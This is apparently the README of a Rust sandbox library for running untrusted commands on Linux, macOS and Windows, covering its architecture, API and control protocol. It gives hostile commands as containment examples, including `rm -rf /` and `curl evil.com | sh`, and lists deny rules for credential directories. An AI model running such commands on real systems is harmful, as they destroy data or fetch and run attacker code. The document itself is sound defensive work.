# tokimo-package-sandbox

[![Crates.io](https://img.shields.io/crates/v/tokimo-package-sandbox.svg)](https://crates.io/crates/tokimo-package-sandbox)
[![Docs.rs](https://docs.rs/tokimo-package-sandbox/badge.svg)](https://docs.rs/tokimo-package-sandbox)
[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](./LICENSE)
[![CI](https://github.com/tokimo-lab/tokimo-package-sandbox/actions/workflows/ci.yml/badge.svg)](https://github.com/tokimo-lab/tokimo-package-sandbox/actions/workflows/ci.yml)

Cross-platform native sandbox for executing untrusted commands safely. Linux (bubblewrap + seccomp), macOS (Seatbelt / Virtualization.framework), Windows (WSL2).

Give it `rm -rf /`, `curl evil.com | sh`, or an interactive `bash` — the host filesystem, network, and process table are protected.

## Platform matrix

| | Linux | macOS (Seatbelt) | macOS (VZ) | Windows |
|---|---|---|---|---|
| **Engine** | bubblewrap + seccomp BPF | sandbox-exec + Seatbelt scheme | Virtualization.framework + Linux VM | WSL2 + bubblewrap |
| **Filesystem** | mount namespace (tmpfs, ro-bind) | Seatbelt file-write* / file-read* deny rules | Linux mount namespace inside VM | same as Linux |
| **Network** | net namespace (none / shared) | Seatbelt (deny network*) | Linux net namespace inside VM | same as Linux |
| **Process** | PID namespace (isolated) | none (host-visible) | PID namespace inside VM | same as Linux |
| **Syscall filter** | seccomp BPF (~300 syscalls) | none (Seatbelt is MAC, not syscall) | seccomp BPF inside VM | same as Linux |
| **Resource limits** | cgroups v2 + rlimits | rlimits (RLIMIT_AS/CPU/FSIZE) | cgroups + rlimits inside VM | same as Linux |
| **Init system** | tokimo-sandbox-init (PID 1) | bash → sentinel protocol | tokimo-sandbox-init (PID 1 in VM) | same as Linux |
| **PTY support** | full (SCM_RIGHTS over SEQPACKET) | limited (no master fd passthrough) | full (same as Linux path) | same as Linux |
| **Network observe** | L4 seccomp-notify + L7 proxy | unsupported | same as Linux inside VM | same as Linux |
| **Session/spawn** | full (init control socket) | file-mode fallback | full (VSOCK to init) | same as Linux |
| **Startup time** | ~50ms | ~5ms | ~1–3s (VM boot) | ~50ms + WSL boot |

## Quick start

```toml
[dependencies]
tokimo-package-sandbox = "0.1"
```

```rust
use tokimo_package_sandbox::{SandboxConfig, NetworkPolicy, ResourceLimits};

let work = tempfile::tempdir()?;

let cfg = SandboxConfig::new(work.path())
    .network(NetworkPolicy::Blocked)
    .limits(ResourceLimits {
        max_memory_mb: 256,
        timeout_secs: 30,
        max_file_size_mb: 16,
        max_processes: 64,
    });

let out = tokimo_package_sandbox::run(&["rm", "-rf", "/"], &cfg)?;
// Host filesystem is untouched — exit_code != 0
```

### System prerequisites

| Platform | Requirement |
|---|---|
| **Linux** | `sudo apt install bubblewrap` (firejail fallback supported) |
| **macOS (Seatbelt)** | nothing — `sandbox-exec` is built-in |
| **macOS (VZ)** | macOS 11+, Linux kernel + initrd from [tokimo-package-rootfs](https://github.com/tokimo-lab/tokimo-package-rootfs) |
| **Windows** | `wsl --install`, then `sudo apt install bubblewrap` inside WSL2 |

## Architecture

### Linux

```
host process
  │
  ├─ Session / run()
  │     │
  │     ├─ Session::open()  ──► spawn_init() ──► bwrap --as-pid-1 --unshare-all
  │     │                                            │
  │     │   tokimo-sandbox-init ◄── control socket ──┘  (SOCK_SEQPACKET)
  │     │     ├─ Op::OpenShell  → bash REPL (sentinel protocol)
  │     │     ├─ Op::Spawn      → child process (pipes or PTY)
  │     │     ├─ Event::Stdout  → base64 chunks
  │     │     └─ Event::Exit    → exit code + signal
  │     │
  │     ├─ Session::exec()   ──► sentinel protocol over bash stdio
  │     ├─ Session::spawn()  ──► init pipe mode (cwd/env inheritance)
  │     ├─ Session::open_pty() ─► SCM_RIGHTS master fd to host
  │     └─ Session::kill_job() ─► Op::Signal(SIGKILL, to_pgrp=true)
  │
  └─ run()  ──► bwrap + seccomp BPF → one-shot process → ExecutionResult
```

- **bwrap** creates user/mount/PID/net/IPC/UTS namespaces
- **seccomp BPF** filters ~300 syscalls (mount, ptrace, kexec, etc.)
- **tokimo-sandbox-init** runs as PID 1, reaps orphans, serves control protocol
- Sensitive host dotfiles (`~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.kube`, `~/.docker`) are tmpfs-blanked even if `$HOME` is mounted

### macOS

macOS provides **two backends** with different trade-offs:

#### 1. Seatbelt (default)

Uses Apple's Mandatory Access Control Framework via `sandbox-exec`. A Scheme profile restricts the child process at the kernel level.

```
macOS host
  │
  ├─ run()  ──► sandbox-exec -f <profile.sb> <command>
  │               │
  │               ├─ (deny network*)           # network blocked
  │               ├─ (deny file-write*)         # all writes denied
  │               │   (allow file-write* work_dir)  # except work dir
  │               ├─ (deny mach-register)      # no Mach IPC
  │               ├─ (deny iokit-open)         # no kernel extensions
  │               └─ (deny file-read* ~/.ssh)  # sensitive paths blocked
  │
  └─ Session::open()  ──► sandbox-exec bash → sentinel protocol
```

- **Zero dependencies** — ships with macOS
- **Fast** — no VM boot, ~5ms overhead
- **Process-visible** — child sees host process table (MAC, not namespace)
- **No syscall filter** — Seatbelt restricts operations, not syscalls directly

#### 2. Virtualization.framework (opt-in, `SAFEBOX_VZ=1`)

Boots a lightweight Linux VM using Apple's native hypervisor. Achieves Linux-grade isolation on macOS.

```
macOS host
  │
  ├─ VzSandbox::boot(cfg)
  │     │
  │     ├─ VirtualMachineConfiguration
  │     │     ├─ LinuxBootLoader(kernel, initrd)
  │     │     ├─ VirtioFileSystem("work")    ← work_dir shared via virtiofs
  │     │     ├─ VirtioSocket                ← VSOCK to tokimo-sandbox-init
  │     │     ├─ VirtioConsole (serial)      ← boot diagnostics
  │     │     └─ CPU + memory
  │     │
  │     ├─ vm.start()
  │     │
  │     └─ sock_dev.connect(port=9999)       ← VSOCK to init inside VM
  │           │
  │           ▼
  │     ┌─────────── Linux VM ───────────┐
  │     │  tokimo-sandbox-init (PID 1)   │
  │     │    ├─ VSOCK listener :9999     │
  │     │    ├─ bwrap child namespaces   │
  │     │    └─ seccomp BPF              │
  │     │                                │
  │     │  virtiofs /tmp → host work_dir │
  │     └────────────────────────────────┘
  │
  └─ Session / spawn / PTY  ──► identical to Linux path (init protocol over VSOCK)
```

- **Full Linux isolation** — namespaces, seccomp, cgroups all intact
- **Same init protocol** — reuses `tokimo-sandbox-init` unchanged
- **VSOCK transport** — virtio-socket replaces Unix SEQPACKET; wire protocol identical
- **Requires artifacts** — Linux kernel + initrd from [tokimo-package-rootfs](https://github.com/tokimo-lab/tokimo-package-rootfs)

**Configuration (env vars):**

| Variable | Default | Description |
|---|---|---|
| `SAFEBOX_VZ` | (unset) | Set to `1` to enable VZ backend |
| `TOKIMO_VZ_KERNEL` | auto-detect | Path to Linux kernel (vmlinuz) |
| `TOKIMO_VZ_INITRD` | auto-detect | Path to initrd with tokimo-sandbox-init |
| `TOKIMO_VZ_MEMORY` | `512` | VM memory in MB |
| `TOKIMO_VZ_CPUS` | `2` | vCPU count |

Kernel and initrd auto-discovery checks `TOKIMO_VZ_*` env, then `~/.tokimo/`, then the current executable directory.

## API reference

### One-shot execution

```rust
pub fn run<S: AsRef<str>>(cmd: &[S], cfg: &SandboxConfig) -> Result<ExecutionResult>;

pub struct ExecutionResult {
    pub stdout: String,
    pub stderr: String,
    pub exit_code: i32,
    pub timed_out: bool,
    pub oom_killed: bool,
}
```

### Persistent sessions

```rust
let mut sess = Session::open(&cfg)?;

// Commands share state — env, cwd, files, background processes
sess.exec("export FOO=bar")?;
sess.exec("cd /tmp && touch hello")?;
let out = sess.exec("echo $FOO && ls")?;

// Background spawn — returns immediately, output collected async
let job = sess.spawn("sleep 5 && echo done")?;
let result = job.wait_with_timeout(Duration::from_secs(10))?;

// Interactive PTY (Linux / macOS VZ only)
let pty = sess.open_pty(24, 80, &["/bin/bash".into(), "-l".into()], &[], None)?;

sess.close()?;
```

### Configuration

```rust
pub struct SandboxConfig {
    pub name: String,             // human-readable label for logs
    pub work_dir: PathBuf,        // only writable location inside sandbox
    pub extra_mounts: Vec<Mount>, // additional host paths to expose
    pub network: NetworkPolicy,   // Blocked | AllowAll | Observed | Gated
    pub limits: ResourceLimits,   // memory, cpu, file size, processes
    pub system_layout: SystemLayout, // HostShared | CallerProvided
    pub env: Vec<(OsString, OsString)>,
    pub stdin: Option<Vec<u8>>,
    pub cwd: Option<PathBuf>,
    pub stream_stderr: bool,
}
```

Builder pattern:

```rust
SandboxConfig::new("/tmp/work")
    .name("agent-sandbox")
    .network(NetworkPolicy::Blocked)
    .limits(ResourceLimits { max_memory_mb: 512, timeout_secs: 60, max_file_size_mb: 64, max_processes: 128 })
    .mount(Mount::ro("/opt/cache"))
    .mount(Mount::rw("/host/output").guest("/out"))
    .env("LANG", "C.UTF-8")
    .cwd("/tmp");
```

### Network policies

| Policy | Network | Visibility | Enforcement | Platform |
|---|---|---|---|---|
| `Blocked` | none | — | — | all |
| `AllowAll` | full host | — | — | all |
| `Observed { sink }` | full | every HTTP(S) request + TCP/UDP connect | advisory only | Linux |
| `Gated { sink, allow_hosts }` | full | same as Observed | deny non-matching hosts | Linux |

On Linux, `Observed` / `Gated` stack three layers: L7 transparent HTTP(S) proxy, L4 seccomp-notify (primary), L4 seccomp-trace (fallback for WSL2 / inherited filters). See [`docs/network-observability.md`](./docs/network-observability.md) for the full design.

## Examples

```bash
cargo run --example basic             # One-shot: ls, id, hostname inside sandbox
cargo run --example shell             # Interactive shell (cross-platform)
cargo run --example rm_rf_test        # Proves rm -rf / can't touch host
cargo run --example session           # Persistent session with state sharing
cargo run --example gated_network     # Network observability demo
cargo run --example l4_observer       # L4+L7 event pipeline
cargo run --example init_smoke        # PID-1 init lifecycle smoke test (Linux)
cargo run --example pty_smoke         # Interactive PTY test (Linux)
```

## Init control protocol (v1)

The host communicates with `tokimo-sandbox-init` via length-prefixed JSON frames over a SEQPACKET socket (Linux) or VSOCK (macOS VZ). PTY master fds are passed via `SCM_RIGHTS`.

```jsonc
// Handshake
client → init  { "op": "Hello", "protocol": 1, "features": [...] }
init   → client { "ok": true, "protocol": 1, "init_pid": 1 }

// Shell lifecycle
client → init  { "op": "OpenShell", "argv": ["/bin/bash","--noprofile","--norc"] }
init   → client { "ok": true, "result": { "child_id": "c1", "pid": 12 } }

// Pipe-mode spawn with cwd/env inheritance
client → init  { "op": "Spawn", "argv": ["/bin/bash","-c","echo hello"],
                 "stdio": "Pipes", "inherit_from_child": "c1" }
init   → client { "ok": true, "result": { "child_id": "c2", "pid": 14 } }

// PTY spawn
client → init  { "op": "Spawn", "argv": ["/bin/bash","-l"],
                 "stdio": { "Pty": { "rows": 24, "cols": 80 } } }
init   → client { "ok": true, "result": { "child_id": "c3", "pid": 15 } }
                  // + SCM_RIGHTS: PTY master fd

// I/O
client → init  { "op": "Write",  "child_id": "c2", "data_b64": "..." }
client → init  { "op": "Resize", "child_id": "c3", "rows": 30, "cols": 100 }
client → init  { "op": "Signal", "child_id": "c2", "sig": 9, "to_pgrp": true }

// Events (init → client)
init   → client { "event": "Stdout", "child_id": "c2", "data_b64": "..." }
init   → client { "event": "Stderr", "child_id": "c2", "data_b64": "..." }
init   → client { "event": "Exit",   "child_id": "c2", "code": 0, "signal": null }
```

## Why this over Docker?

| | tokimo-package-sandbox | Docker |
|---|---|---|
| **Daemon** | none (library call) | dockerd required |
| **Startup** | ~50ms (Linux) / ~5ms (Seatbelt) | ~1–3s (container cold start) |
| **Images** | none (reuses host /usr, /bin, /lib) | required |
| **API** | Rust native | subprocess `docker run` |
| **Size** | ~200 KB runtime dep (bwrap) | ~100+ MB daemon + images |
| **Use case** | "run this one untrusted command" | "deploy this service stack" |

Not a Docker replacement — a sharper tool for a narrower job.

## Caveats

- **Linux seccomp** syscall tables are shipped for x86_64 and aarch64. Other architectures get namespace isolation but no syscall filtering.
- **macOS VZ** requires `com.apple.security.virtualization` entitlement for signed apps. Unsigned development builds work without it.
- **Windows** native (without WSL2) is refused — Windows Job Objects do not provide comparable filesystem isolation.
- `SAFEBOX_DISABLE=1` bypasses all sandboxing. Debug only.

## Related projects

| Project | Description |
|---|---|
| [tokimo-package-rootfs](https://github.com/tokimo-lab/tokimo-package-rootfs) | Debian-based rootfs for Linux bwrap and macOS VZ VM |

## Documentation

- [`docs/network-observability.md`](./docs/network-observability.md) — L4/L7 network observability design
- [`docs/db-as-filesystem.md`](./docs/db-as-filesystem.md) — database-as-filesystem pattern for sandboxed bash
- [`docs/api.md`](./docs/api.md) — extended API reference

## License

MIT. See [LICENSE](./LICENSE).
